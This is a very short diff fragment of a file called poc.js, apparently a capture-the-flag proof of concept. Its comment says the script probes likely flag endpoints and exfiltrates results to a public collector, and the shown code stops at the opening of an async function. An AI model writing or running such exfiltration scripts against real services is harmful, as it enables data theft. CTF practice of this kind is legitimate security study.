@@ -1,4 +1,3 @@
-
 // poc.js — try several likely flag endpoints and exfiltrate to a public collector
 (async () => {
   try {
